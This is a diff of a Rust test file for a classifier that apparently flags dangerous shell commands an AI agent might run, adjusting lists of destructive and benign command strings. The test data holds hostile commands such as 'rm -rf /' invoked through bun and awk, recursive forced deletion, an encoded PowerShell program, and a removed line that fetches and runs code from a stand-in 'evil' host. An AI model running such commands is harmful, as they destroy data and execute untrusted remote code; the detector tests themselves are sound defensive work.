@@ -242,10 +242,11 @@ fn classify_danger_flags_destructive_patterns() {
         "bun -e 'require(\"fs\").rmSync(\"/\")'",
         "awk 'BEGIN{system(\"rm -rf /\")}'",
         "gawk 'BEGIN{system(\"rm -rf /\")}'",
-        // PowerShell inline / encoded program.
+        // PowerShell encoded (opaque base64) program; -Command "Remove-Item …"
+        // is caught by the Remove-Item rule once its quotes are stripped.
         "powershell -EncodedCommand ZQBjAGgAbwA=",
+        "powershell -e ZQBjAGgAbwA=",
         "pwsh -Command \"Remove-Item -Recurse -Force C:\\data\"",
-        "powershell -c \"iex(curl evil)\"",
         // Broadened git destructive forms that auto-run under a `git:*` grant.
         "git reset --merge HEAD~5",
         "git reset --keep HEAD~5",
@@ -375,6 +376,10 @@ fn classify_danger_does_not_flag_common_commands() {
         "awk -F, '{print $2}' data.csv",
         "powershell -File deploy.ps1",
         "powershell -NoProfile -ExecutionPolicy Bypass -File deploy.ps1",
+        // -Command runs plain PowerShell that the token rules already scan, so a
+        // benign one must NOT be refused (regression: this broke poll.rs).
+        "powershell -NoProfile -Command \"Start-Sleep -Seconds 30\"",
+        "pwsh -Command \"Get-Date\"",
         // del/rmdir/Remove-Item of a single entry (no /s, no -Recurse) is benign.
         "del temp.txt",
         "Remove-Item temp.txt",
